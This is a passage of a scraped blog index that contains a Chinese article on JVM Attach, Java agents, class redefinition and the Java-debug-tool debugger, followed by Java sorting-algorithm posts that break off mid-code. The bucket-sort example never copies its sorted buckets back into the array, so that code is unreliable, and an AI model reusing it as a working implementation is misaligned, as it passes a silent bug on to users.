result(T_VOID); JavaCalls::call_special(&amp;result, thread_oop,klass,vmSymbols::object_initializer_name(),vmSymbols::threadgroup_string_void_signature(), thread_group,string,CHECK); KlassHandle group(THREAD, SystemDictionary::ThreadGroup_klass()); JavaCalls::call_special(&amp;result,thread_group,group,vmSymbols::add_method_name(),vmSymbols::thread_void_signature(),thread_oop,CHECK); os::signal_init_pd(); &#123; MutexLocker mu(Threads_lock); JavaThread* signal_thread = new JavaThread(&amp;signal_thread_entry); // ... &#125; // Handle ^BREAK os::signal(SIGBREAK, os::user_handler()); &#125;&#125; JVM 创建了一个新的进程来实现信号处理，这个线程叫“Signal Dispatcher”，一个线程创建之后需要有一个入口，“Signal Dispatcher”的入口是 signal_thread_entry： 这段代码截取自 signal_thread_entry 函数，截取中的内容是和 Attach 机制信号处理相关的代码。这段代码的意思是，当接收到“SIGBREAK”信号，就执行接下来的代码，这个信号是需要 Attach 到 JVM 上的信号发出来，这个后面会再分析。我们先来看一句关键的代码：AttachListener::is_init_trigger()： 123456789101112131415161718192021222324bool AttachListener::is_init_trigger() &#123; if (init_at_startup() || is_initialized()) &#123; return false; // initialized at startup or already initialized &#125; char fn[PATH_MAX+1]; sprintf(fn, &quot;.attach_pid%d&quot;, os::current_process_id()); int ret; struct stat64 st; RESTARTABLE(::stat64(fn, &amp;st), ret); if (ret == -1) &#123; log_trace(attach)(&quot;Failed to find attach file: %s, trying alternate&quot;, fn); snprintf(fn, sizeof(fn), &quot;%s/.attach_pid%d&quot;, os::get_temp_directory(), os::current_process_id()); RESTARTABLE(::stat64(fn, &amp;st), ret); &#125; if (ret == 0) &#123; // simple check to avoid starting the attach mechanism when // a bogus user creates the file if (st.st_uid == geteuid()) &#123; init(); return true; &#125; &#125; return false;&#125; 首先检查了一下是否在 JVM 启动时启动了 Attach Listener，或者是否已经启动过。如果没有，才继续执行，在/tmp 目录下创建一个叫做.attach_pid%d 的文件，然后执行 AttachListener 的 init 函数，这个函数就是用来创建 Attach Listener 线程的函数，上面已经提到多次并进行了分析。到此，我们知道 Attach 机制的奥秘所在，也就是 Attach Listener 线程的创建依靠 Signal Dispatcher 线程，Signal Dispatcher 是用来处理信号的线程，当 Signal Dispatcher 线程接收到“SIGBREAK”信号之后，就会执行初始化 Attach Listener 的工作。 2.3.2 运行时加载 Agent 的实现我们继续分析，到底是如何将一个 Agent 挂载到运行着的目标 JVM 上，在上文中提到了一段代码，用来进行运行时挂载 Agent，可以参考上文中展示的关于“attachAgentToTargetJvm”方法的代码。这个方法里面的关键是调用 VirtualMachine 的 attach 方法进行 Agent 挂载的功能。下面我们就来分析一下 VirtualMachine 的 attach 方法具体是怎么实现的。 12345678910111213141516171819202122public static VirtualMachine attach(String var0) throws AttachNotSupportedException, IOException &#123; if (var0 == null) &#123; throw new NullPointerException(&quot;id cannot be null&quot;); &#125; else &#123; List var1 = AttachProvider.providers(); if (var1.size() == 0) &#123; throw new AttachNotSupportedException(&quot;no providers installed&quot;); &#125; else &#123; AttachNotSupportedException var2 = null; Iterator var3 = var1.iterator(); while(var3.hasNext()) &#123; AttachProvider var4 = (AttachProvider)var3.next(); try &#123; return var4.attachVirtualMachine(var0); &#125; catch (AttachNotSupportedException var6) &#123; var2 = var6; &#125; &#125; throw var2; &#125; &#125;&#125; 这个方法通过 attachVirtualMachine 方法进行 attach 操作，在 MacOS 系统中，AttachProvider 的实现类是 BsdAttachProvider。我们来看一下 BsdAttachProvider 的 attachVirtualMachine 方法是如何实现的： 12345678910111213141516171819202122232425262728293031323334353637public VirtualMachine attachVirtualMachine(String var1) throws AttachNotSupportedException, IOException &#123; this.checkAttachPermission(); this.testAttachable(var1); return new BsdVirtualMachine(this, var1); &#125;BsdVirtualMachine(AttachProvider var1, String var2) throws AttachNotSupportedException, IOException &#123; int var3 = Integer.parseInt(var2); this.path = this.findSocketFile(var3); if (this.path == null) &#123; File var4 = new File(tmpdir, &quot;.attach_pid&quot; + var3); createAttachFile(var4.getPath()); try &#123; sendQuitTo(var3); int var5 = 0; long var6 = 200L; int var8 = (int)(this.attachTimeout() / var6); do &#123; try &#123; Thread.sleep(var6); &#125; catch (InterruptedException var21) &#123; ; &#125; this.path = this.findSocketFile(var3); ++var5; &#125; while(var5 &lt;= var8 &amp;&amp; this.path == null); &#125; finally &#123; var4.delete(); &#125; &#125; int var24 = socket(); connect(var24, this.path); &#125; private String findSocketFile(int var1) &#123; String var2 = &quot;.java_pid&quot; + var1; File var3 = new File(tmpdir, var2); return var3.exists() ? var3.getPath() : null; &#125; findSocketFile 方法用来查询目标 JVM 上是否已经启动了 Attach Listener，它通过检查”tmp/“目录下是否存在 java_pid{pid}来进行实现。如果已经存在了，则说明 Attach 机制已经准备就绪，可以接受客户端的命令了，这个时候客户端就可以通过 connect 连接到目标 JVM 进行命令的发送，比如可以发送“load”命令来加载 Agent。如果 java_pid{pid}文件还不存在，则需要通过 sendQuitTo 方法向目标 JVM 发送一个“SIGBREAK”信号，让它初始化 Attach Listener 线程并准备接受客户端连接。可以看到，发送了信号之后客户端会循环等待 java_pid{pid}这个文件，之后再通过 connect 连接到目标 JVM 上。 2.3.3 load 命令的实现下面来分析一下，“load”命令在 JVM 层面的实现： 1234567891011121314151617static jint load_agent(AttachOperation* op, outputStream* out) &#123; // get agent name and options const char* agent = op-&gt;arg(0); const char* absParam = op-&gt;arg(1); const char* options = op-&gt;arg(2); // If loading a java agent then need to ensure that the java.instrument module is loaded if (strcmp(agent, &quot;instrument&quot;) == 0) &#123; Thread* THREAD = Thread::current(); ResourceMark rm(THREAD); HandleMark hm(THREAD); JavaValue result(T_OBJECT); Handle h_module_name = java_lang_String::create_from_str(&quot;java.instrument&quot;, THREAD); JavaCalls::call_static(&amp;result,SystemDictionary::module_Modules_klass(),vmSymbols::loadModule_name(), vmSymbols::loadModule_signature(),h_module_name,THREAD); &#125; return JvmtiExport::load_agent_library(agent, absParam, options, out);&#125; 这个函数先确保加载了 java.instrument 模块，之后真正执行 Agent 加载的函数是 load_agent_library ,这个函数的套路就是加载 Agent 动态链接库，如果是通过 Java instrument API 实现的 Agent，则加载的是 libinstrument 动态链接库，然后通过 libinstrument 里面的代码实现运行 agentmain 方法的逻辑，这一部分内容和 libinstrument 实现 premain 方法运行的逻辑其实差不多，这里不再做分析。至此，我们对 Java Agent 技术已经有了一个全面而细致的了解。 3. 动态替换类字节码技术3.1 动态字节码修改的限制上文中已经详细分析了 Agent 技术的实现，我们使用 Java Instrumentation API 来完成动态类修改的功能，在 Instrumentation 接口中，通过 addTransformer 方法来增加一个类转换器，类转换器由类 ClassFileTransformer 接口实现。ClassFileTransformer 接口中唯一的方法 transform 用于实现类转换，当类被加载的时候，就会调用 transform 方法，进行类转换。在运行时，我们可以通过 Instrumentation 的 redefineClasses 方法进行类重定义，在方法上有一段注释需要特别注意： The redefinition may change method bodies, the constant pool and attributes. The redefinition must not add, remove or rename fields or methods, change the signatures of methods, or change inheritance. These restrictions maybe be lifted in future versions. The class file bytes are not checked, verified and installed until after the transformations have been applied, if the resultant bytes are in error this method will throw an exception.这里面提到，我们不可以增加、删除或者重命名字段和方法，改变方法的签名或者类的继承关系。认识到这一点很重要，当我们通过 ASM 获取到增强的字节码之后，如果增强后的字节码没有遵守这些规则，那么调用 redefineClasses 方法来进行类的重定义就会失败。那 redefineClasses 方法具体是怎么实现类的重定义的呢？它对运行时的 JVM 会造成什么样的影响呢？下面来分析 redefineClasses 的实现细节。 3.2 重定义类字节码的实现细节上文中我们提到，libinstrument 动态链接库中，JPLISAgent 不仅实现了 Agent 入口代码执行的路由，而且还是 Java 代码与 JVMTI 之间的一道桥梁。我们在 Java 代码中调用 Java Instrumentation API 的 redefineClasses，其实会调用 libinstrument 中的相关代码，我们来分析一下这条路径。 1234567891011121314151617public void redefineClasses(ClassDefinition... var1) throws ClassNotFoundException &#123; if (!this.isRedefineClassesSupported()) &#123; throw new UnsupportedOperationException(&quot;redefineClasses is not supported in this environment&quot;); &#125; else if (var1 == null) &#123; throw new NullPointerException(&quot;null passed as &#x27;definitions&#x27; in redefineClasses&quot;); &#125; else &#123; for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123; if (var1[var2] == null) &#123; throw new NullPointerException(&quot;element of &#x27;definitions&#x27; is null in redefineClasses&quot;); &#125; &#125; if (var1.length != 0) &#123; this.redefineClasses0(this.mNativeAgent, var1); &#125; &#125;&#125;private native void redefineClasses0(long var1, ClassDefinition[] var3) throws ClassNotFoundException; 这是 InstrumentationImpl 中的 redefineClasses 实现，该方法的具体实现依赖一个 Native 方法 redefineClasses()，我们可以在 libinstrument 中找到这个 Native 方法的实现： 1234JNIEXPORT void JNICALL Java_sun_instrument_InstrumentationImpl_redefineClasses0 (JNIEnv * jnienv, jobject implThis, jlong agent, jobjectArray classDefinitions) &#123; redefineClasses(jnienv, (JPLISAgent*)(intptr_t)agent, classDefinitions);&#125; redefineClasses 这个函数的实现比较复杂，代码很长。下面是一段关键的代码片段： 可以看到，其实是调用了 JVMTI 的 RetransformClasses 函数来完成类的重定义细节。 12345678// class_count - pre-checked to be greater than or equal to 0// class_definitions - pre-checked for NULLjvmtiError JvmtiEnv::RedefineClasses(jint class_count, const jvmtiClassDefinition* class_definitions) &#123;//TODO: add locking VM_RedefineClasses op(class_count, class_definitions, jvmti_class_load_kind_redefine); VMThread::execute(&amp;op); return (op.check_error());&#125; /* end RedefineClasses */ 重定义类的请求会被 JVM 包装成一个 VM_RedefineClasses 类型的 VM_Operation，VM_Operation 是 JVM 内部的一些操作的基类，包括 GC 操作等。VM_Operation 由 VMThread 来执行，新的 VM_Operation 操作会被添加到 VMThread 的运行队列中去，VMThread 会不断从队列里面拉取 VM_Operation 并调用其 doit 等函数执行具体的操作。VM_RedefineClasses 函数的流程较为复杂，下面是 VM_RedefineClasses 的大致流程： 加载新的字节码，合并常量池，并且对新的字节码进行校验工作// Load the caller’s new class definition(s) into _scratch_classes.// Constant pool merging work is done here as needed. Also calls// compare_and_normalize_class_versions() to verify the class// definition(s).jvmtiError load_new_class_versions(TRAPS);清除方法上的断点 1234567 // Remove all breakpoints in methods of this class JvmtiBreakpoints&amp; jvmti_breakpoints = JvmtiCurrentBreakpoints::get_jvmti_breakpoints(); jvmti_breakpoints.clearall_in_class_at_safepoint(the_class());JIT逆优化 // Deoptimize all compiled code that depends on this class flush_dependent_code(the_class, THREAD); 进行字节码替换工作，需要进行更新类 itable/vtable 等操作进行类重定义通知 1SystemDictionary::notice_modification(); VM_RedefineClasses 实现比较复杂的，详细实现可以参考 RedefineClasses 的实现。 4. Java-debug-tool 设计与实现Java-debug-tool 是一个使用 Java Instrument API 来实现的动态调试工具，它通过在目标 JVM 上启动一个 TcpServer 来和调试客户端通信。调试客户端通过命令行来发送调试命令给 TcpServer，TcpServer 中有专门用来处理命令的 handler，handler 处理完命令之后会将结果发送回客户端，客户端通过处理将调试结果展示出来。下面将详细介绍 Java-debug-tool 的整体设计和实现。 4.1 Java-debug-tool 整体架构Java-debug-tool 包括一个 Java Agent 和一个用于处理调试命令的核心 API，核心 API 通过一个自定义的类加载器加载进来，以保证目标 JVM 的类不会被污染。整体上 Java-debug-tool 的设计是一个 Client-Server 的架构，命令客户端需要完整的完成一个命令之后才能继续执行下一个调试命令。Java-debug-tool 支持多人同时进行调试，下面是整体架构图： 下面对每一层做简单介绍： 交互层：负责将程序员的输入转换成调试交互协议，并且将调试信息呈现出来。 连接管理层：负责管理客户端连接，从连接中读调试协议数据并解码，对调试结果编码并将其写到连接中去；同时将那些超时未活动的连接关闭。 业务逻辑层：实现调试命令处理，包括命令分发、数据收集、数据处理等过程。 基础实现层：Java-debug-tool 实现的底层依赖，通过 Java Instrumentation 提供的 API 进行类查找、类重定义等能力，Java Instrumentation 底层依赖 JVMTI 来完成具体的功能。 在 Agent 被挂载到目标 JVM 上之后，Java-debug-tool 会安排一个 Spy 在目标 JVM 内活动，这个 Spy 负责将目标 JVM 内部的相关调试数据转移到命令处理模块，命令处理模块会处理这些数据，然后给客户端返回调试结果。命令处理模块会增强目标类的字节码来达到数据获取的目的，多个客户端可以共享一份增强过的字节码，无需重复增强。下面从 Java-debug-tool 的字节码增强方案、命令设计与实现等角度详细说明。 4.2 Java-debug-tool 的字节码增强方案Java-debug-tool 使用字节码增强来获取到方法运行时的信息，比如方法入参、出参等，可以在不同的字节码位置进行增强，这种行为可以称为“插桩”，每个“桩”用于获取数据并将他转储出去。Java-debug-tool 具备强大的插桩能力，不同的桩负责获取不同类别的数据，下面是 Java-debug-tool 目前所支持的“桩”： 方法进入点：用于获取方法入参信息。 Fields 获取点 1：在方法执行前获取到对象的字段信息。 变量存储点：获取局部变量信息。 Fields 获取点 2：在方法退出前获取到对象的字段信息。 方法退出点：用于获取方法返回值。 抛出异常点：用于获取方法抛出的异常信息。 通过上面这些代码桩，Java-debug-tool 可以收集到丰富的方法执行信息，经过处理可以返回更加可视化的调试结果。 4.2.1 字节码增强Java-debug-tool 在实现上使用了 ASM 工具来进行字节码增强，并且每个插桩点都可以进行配置，如果不想要什么信息，则没必要进行对应的插桩操作。这种可配置的设计是非常有必要的，因为有时候我们仅仅是想要知道方法的入参和出参，但 Java-debug-tool 却给我们返回了所有的调试信息，这样我们就得在众多的输出中找到我们所关注的内容。如果可以进行配置，则除了入参点和出参点外其他的桩都不插，那么就可以快速看到我们想要的调试数据，这种设计的本质是为了让调试者更加专注。下面是 Java-debug-tool 的字节码增强工作方式： 图 4-2-1 如图 4-2-1 所示，当调试者发出调试命令之后，Java-debug-tool 会识别命令并判断是否需要进行字节码增强，如果命令需要增强字节码，则判断当前类+当前方法是否已经被增强过。上文已经提到，字节码替换是有一定损耗的，这种具有损耗的操作发生的次数越少越好，所以字节码替换操作会被记录起来，后续命令直接使用即可，不需要重复进行字节码增强，字节码增强还涉及多个调试客户端的协同工作问题，当一个客户端增强了一个类的字节码之后，这个客户端就锁定了该字节码，其他客户端变成只读，无法对该类进行字节码增强，只有当持有锁的客户端主动释放锁或者断开连接之后，其他客户端才能继续增强该类的字节码。字节码增强模块收到字节码增强请求之后，会判断每个增强点是否需要插桩，这个判断的根据就是上文提到的插桩配置，之后字节码增强模块会生成新的字节码，Java-debug-tool 将执行字节码替换操作，之后就可以进行调试数据收集了。经过字节码增强之后，原来的方法中会插入收集运行时数据的代码，这些代码在方法被调用的时候执行，获取到诸如方法入参、局部变量等信息，这些信息将传递给数据收集装置进行处理。数据收集的工作通过 Advice 完成，每个客户端同一时间只能注册一个 Advice 到 Java-debug-tool 调试模块上，多个客户端可以同时注册自己的 Advice 到调试模块上。Advice 负责收集数据并进行判断，如果当前数据符合调试命令的要求，Java-debug-tool 就会卸载这个 Advice，Advice 的数据就会被转移到 Java-debug-tool 的命令结果处理模块进行处理，并将结果发送到客户端。 4.2.2 Advice 的工作方式Advice 是调试数据收集器，不同的调试策略会对应不同的 Advice。Advice 是工作在目标 JVM 的线程内部的，它需要轻量级和高效，意味着 Advice 不能做太过于复杂的事情，它的核心接口“match”用来判断本次收集到的调试数据是否满足调试需求。如果满足，那么 Java-debug-tool 就会将其卸载，否则会继续让他收集调试数据，这种“加载 Advice” -&gt; “卸载 Advice”的工作模式具备很好的灵活性。关于 Advice，需要说明的另外一点就是线程安全，因为它加载之后会运行在目标 JVM 的线程中，目标 JVM 的方法极有可能是多线程访问的，这也就是说，Advice 需要有能力处理多个线程同时访问方法的能力，如果 Advice 处理不当，则可能会收集到杂乱无章的调试数据。下面的图片展示了 Advice 和 Java-debug-tool 调试分析模块、目标方法执行以及调试客户端等模块的关系。 图 4-2-2Advice 的首次挂载由 Java-debug-tool 的命令处理器完成，当一次调试数据收集完成之后，调试数据处理模块会自动卸载 Advice，然后进行判断，如果调试数据符合 Advice 的策略，则直接将数据交由数据处理模块进行处理，否则会清空调试数据，并再次将 Advice 挂载到目标方法上去，等待下一次调试数据。非首次挂载由调试数据处理模块进行，它借助 Advice 按需取数据，如果不符合需求，则继续挂载 Advice 来获取数据，否则对调试数据进行处理并返回给客户端。 4.3 Java-debug-tool 的命令设计与实现4.3.1 命令执行上文已经完整的描述了 Java-debug-tool 的设计以及核心技术方案，本小节将详细介绍 Java-debug-tool 的命令设计与实现。首先需要将一个调试命令的执行流程描述清楚，下面是一张用来表示命令请求处理流程的图片： 图 4-3-1图 4-3-1 简单的描述了 Java-debug-tool 的命令处理方式，客户端连接到服务端之后，会进行一些协议解析、协议认证、协议填充等工作，之后将进行命令分发。服务端如果发现客户端的命令不合法，则会立即返回错误信息，否则再进行命令处理。命令处理属于典型的三段式处理，前置命令处理、命令处理以及后置命令处理，同时会对命令处理过程中的异常信息进行捕获处理，三段式处理的好处是命令处理被拆成了多个阶段，多个阶段负责不同的职责。前置命令处理用来做一些命令权限控制的工作，并填充一些类似命令处理开始时间戳等信息，命令处理就是通过字节码增强，挂载 Advice 进行数据收集，再经过数据处理来产生命令结果的过程，后置处理则用来处理一些连接关闭、字节码解锁等事项。Java-debug-tool 允许客户端设置一个命令执行超时时间，超过这个时间则认为命令没有结果，如果客户端没有设置自己的超时时间，就使用默认的超时时间进行超时控制。Java-debug-tool 通过设计了两阶段的超时检测机制来实现命令执行超时功能：首先，第一阶段超时触发，则 Java-debug-tool 会友好的警告命令处理模块处理时间已经超时，需要立即停止命令执行，这允许命令自己做一些现场清理工作，当然需要命令执行线程自己感知到这种超时警告；当第二阶段超时触发，则 Java-debug-tool 认为命令必须结束执行，会强行打断命令执行线程。超时机制的目的是为了不让命令执行太长时间，命令如果长时间没有收集到调试数据，则应该停止执行，并思考是否调试了一个错误的方法。当然，超时机制还可以定期清理那些因为未知原因断开连接的客户端持有的调试资源，比如字节码锁。 4.3.4 获取方法执行视图Java-debug-tool 通过下面的信息来向调试者呈现出一次方法执行的视图：正在调试的方法信息。 方法调用堆栈。 调试耗时，包括对目标 JVM 造成的 STW 时间。 方法入参，包括入参的类型及参数值。 方法的执行路径。 代码执行耗时。 局部变量信息。 方法返回结果。 方法抛出的异常。 对象字段值快照。 图 4-3-2 展示了 Java-debug-tool 获取到正在运行的方法的执行视图的信息。 图 4-3-2 4.4 Java-debug-tool 与同类产品对比分析Java-debug-tool 的同类产品主要是 greys，其他类似的工具大部分都是基于 greys 进行的二次开发，所以直接选择 greys 来和 Java-debug-tool 进行对比。 5. 总结本文详细剖析了 Java 动态调试关键技术的实现细节，并介绍了我们基于 Java 动态调试技术结合实际故障排查场景进行的一点探索实践；动态调试技术为研发人员进行线上问题排查提供了一种新的思路，我们基于动态调试技术解决了传统断点调试存在的问题，使得可以将断点调试这种技术应用在线上，以线下调试的思维来进行线上调试，提高问题排查效率。 6. 参考文献ASM 4 guide Java Virtual Machine Specification JVM Tool Interface alibaba arthas openjdk 摘自https://mp.weixin.qq.com/s/ZlNcvwJ_swspifWTLHA92Q","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"动态调试技术","slug":"动态调试技术","permalink":"https://wuhaocn.github.io/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"桶排序","slug":"algorithm/sort/8-桶排序","date":"2021-10-01T13:12:11.456Z","updated":"2021-10-01T13:12:11.456Z","comments":true,"path":"2021/10/01/algorithm/sort/8-桶排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/8-%E6%A1%B6%E6%8E%92%E5%BA%8F/","excerpt":"","text":"桶排序详细参考 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 桶排序 * &lt;p&gt; 桶排序的基本思想是： 把数组 arr 划分为 n 个大小相同子区间（桶），每个子区间各自排序，最 后合并 。计数排序是桶排序的一种特殊情况，可以把计数排序当成每个桶里只有一个元素的情况。 1.找出待排序数组中的最大值 max、最小值 min 2.我们使用 动态数组 ArrayList 作为桶，桶里放的元素也用 ArrayList 存储。桶的数量为(max min)/arr.length+1 3.遍历数组 arr，计算每个元素 arr[i] 放的桶 4.每个桶各自排序 */public class BucketSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; BucketSort bucketSort = new BucketSort(); System.out.println(&quot;BucketSort&quot;); bucketSort.sort(numbers); bucketSort.print(numbers); &#125; @Override public void sort(int[] arr) &#123; int max = Integer.MIN_VALUE; int min = Integer.MAX_VALUE; for (int i = 0; i &lt; arr.length; i++) &#123; max = Math.max(max, arr[i]); min = Math.min(min, arr[i]); &#125; //创建桶 int bucketNum = (max - min) / arr.length + 1; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; bucketArr = new ArrayList&lt;&gt;(bucketNum); for (int i = 0; i &lt; bucketNum; i++) &#123; bucketArr.add(new ArrayList&lt;Integer&gt;()); &#125; //将每个元素放入桶 for (int i = 0; i &lt; arr.length; i++) &#123; int num = (arr[i] - min) / (arr.length); bucketArr.get(num).add(arr[i]); &#125; //对每个桶进行排序 for (int i = 0; i &lt; bucketArr.size(); i++) &#123; Collections.sort(bucketArr.get(i)); &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"计数排序","slug":"algorithm/sort/7.计数排序","date":"2021-10-01T13:12:11.456Z","updated":"2021-10-01T13:12:11.456Z","comments":true,"path":"2021/10/01/algorithm/sort/7.计数排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/7.%E8%AE%A1%E6%95%B0%E6%8E%92%E5%BA%8F/","excerpt":"","text":"计数排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package org.coral.algorithm.sort;/** * 1.找出待排序的数组中最大和最小的元素； 2.统计数组中每个值为i的元素出现的次数,存入数组C的第i项； 3.对所有的计数累加(从C中的第一个元素开始,每一项和前一项相加）； 4.反向填充目标数组:将每个元素i放在新数组的第C(i)项,每放一个元素就将C(i)减去1. */public class CountSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; CountSort countSort = new CountSort(); countSort.print(numbers); countSort.sort(numbers); &#125; @Override public void sort(int[] numbers) &#123; int max = Integer.MIN_VALUE; int min = Integer.MAX_VALUE; //找出数组中的最大最小值 for(int i = 0; i &lt; numbers.length; i++)&#123; max = Math.max(max, numbers[i]); min = Math.min(min, numbers[i]); &#125; int[] help = new int[max - min + 1]; //找出每个数字出现的次数 for(int i = 0; i &lt; numbers.length; i++)&#123; int mapPos = numbers[i] - min; help[mapPos]++; &#125; //计算每个数字应该在排序后数组中应该处于的位置 for(int i = 1; i &lt; help.length; i++)&#123; help[i] = help[i-1] + help[i]; &#125; //根据help数组进行排序 int res[] = new int[numbers.length]; for(int i = 0; i &lt; numbers.length; i++)&#123; int post = --help[numbers[i] - min]; res[post] = numbers[i]; &#125; print(res); &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"基数排序","slug":"algorithm/sort/9-基数排序","date":"2021-10-01T13:12:11.456Z","updated":"2021-10-01T13:12:11.456Z","comments":true,"path":"2021/10/01/algorithm/sort/9-基数排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/9-%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/","excerpt":"","text":"基数排序详细参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * 基数排序 * 将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位 * 开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后,数列就变成一个有序序 * 列。 */public class RadixSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; RadixSort radixSort = new RadixSort(); System.out.println(&quot;RadixSort&quot;); radixSort.sort(numbers); radixSort.print(numbers); &#125; @Override public void sort(int[] array) &#123; //首先确定排序的趟数; int max = array[0]; for (int i = 1; i &lt; array.length; i++) &#123; if (array[i] &gt; max) &#123; max = array[i]; &#125; &#125; int time = 0; //判断位数; while (max &gt; 0) &#123; max /= 10; time++; &#125; //建立 10 个队列; List&lt;ArrayList&gt; queue = new ArrayList&lt;ArrayList&gt;(); for (int i = 0; i &lt; 10; i++) &#123; ArrayList&lt;Integer&gt; queue1 = new ArrayList&lt;Integer&gt;(); queue.add(queue1); &#125; //进行 time 次分配和收集; for (int i = 0; i &lt; time; i++) &#123; //分配数组元素; for (int j = 0; j &lt; array.length; j++) &#123; //得到数字的第 time+1 位数; int x = array[j] % (int) Math.pow(10, i + 1) / (int) Math.pow(10, i); ArrayList&lt;Integer&gt; queue2 = queue.get(x); queue2.add(array[j]); queue.set(x, queue2); &#125; int count = 0;//元素计数器; //收集队列元素; for (int k = 0; k &lt; 10; k++) &#123; while (queue.get(k).size() &gt; 0) &#123; ArrayList&lt;Integer&gt; queue3 = queue.get(k); array[count] = queue3.get(0); queue3.remove(0); count++; &#125; &#125; &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"希尔排序","slug":"algorithm/sort/5-希尔排序","date":"2021-10-01T13:12:11.455Z","updated":"2021-10-01T13:12:11.455Z","comments":true,"path":"2021/10/01/algorithm/sort/5-希尔排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/5-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F/","excerpt":"","text":"希尔排序详细参考 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 希尔排序 * &lt;p&gt; * 基本思想：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列 * 中的记录“基本有序” 时，再对全体记录进行依次直接插入排序。 * 1. 操作方法： * 选择一个增量序列 t1， t2， …， tk，其中 ti&gt;tj， tk=1； * 2. 按增量序列个数 k，对序列进行 k 趟排序； * 3. 每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进 * 行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长 * 度。 */public class ShellSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; ShellSort shellSort = new ShellSort(); System.out.println(&quot;ShellSort&quot;); shellSort.sort(numbers); shellSort.print(numbers); &#125; @Override public void sort(int[] arr) &#123; int dk = arr.length / 2; while (dk &gt;= 1) &#123; ShellInsertSort(arr, dk); dk = dk / 2; &#125; &#125; private void ShellInsertSort(int[] a, int dk) &#123; //类似插入排序，只是插入排序增量是 1，这里增量是 dk,把 1 换成 dk 就可以了 for (int i = dk; i &lt; a.length; i++) &#123; if (a[i] &lt; a[i - dk]) &#123; int j; int x = a[i];//x 为待插入元素 a[i] = a[i - dk]; for (j = i - dk; j &gt;= 0 &amp;&amp; x &lt; a[j]; j = j - dk) &#123; //通过循环，逐个后移一位找到要插入的位置。 a[j + dk] = a[j]; &#125; a[j + dk] = x;//插入 &#125; &#125; &#125;&#125;","categories":[{"name":"algorithm","slug":"algorithm","permalink":"https://wuhaocn.github.io/categories/algorithm/"}],"tags":[{"name":"sort","slug":"sort","permalink":"https://wuhaocn.github.io/tags/sort/"}]},{"title":"归并（Merge）排序","slug":"algorithm/sort/4-归并排序","date":"2021-10-01T13:12:11.455Z","updated":"2021-10-01T13:12:11.455Z","comments":true,"path":"2021/10/01/algorithm/sort/4-归并排序/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/algorithm/sort/4-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/","excerpt":"","text":"归并（Merge）排序详细参考 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 归并（Merge）排序 * &lt;p&gt; 归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序 分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。 */public class MergeSort implements Sort &#123; public static void main(String[] args) &#123; int[] numbers = &#123;34, 12, 23, 56, 56, 56, 78&#125;; MergeSort mergeSort = new MergeSort(); System.out.println(&quot;MergeSort&quot;); mergeSort.sort(numbers); mergeSort.print(numbers); &#125; @Override public void sort(int[] arr) &#123; sort(arr, 0, arr.length - 1); &#125; public void sort(int[] data, int left, int right) &#123; if (left &gt;= right) return; // 找出中间索引 int center = (left + right) / 2; // 对左边数组进行递归 sort(data, left, center); // 对右边数组进行递归 sort(data, center + 1, right); // 合并 merge(data, left, center, right); print(data); &#125; /** * 将两个数组进行归并，归并前面 2 个数组已有序，归并后依然有序13/04/2018 Page 239 of 283 * * @param data 数组对象 * @param left 左数组的第一个元素的索引 * @param center 左数组的最后一个元素的索引， center+1 是右数组第一个元素的索引 * @param right 右数组最后一个元素的索引 */ public static void merge(int[] data, int left, int center, int right) &#123; // 临时数组 int[] tmpArr = new int[data.length]; // 右数组第一个元素索引 int mid = center + 1; // third 记录临时数组的索引 int third = left; // 缓存左数组第一个元素的索引 int tmp = left; while (left &lt;= center &amp;&amp; mid &lt;= right) &#123; // 从两个数组中取出最小的放入临时数组 if (data[left] &lt;= data[mid]) &#123; tmpArr[third++] = data[left++]; &#125; else &#123; tmpArr[third++] = data[mid++]; &#125; &#125; // 剩余部分依次放入临时数组（实际上两个 while 只会执行其中一个） while (mid &lt;= right) &#123; tmpArr[third++] = data[mid++]; &#125; while (left 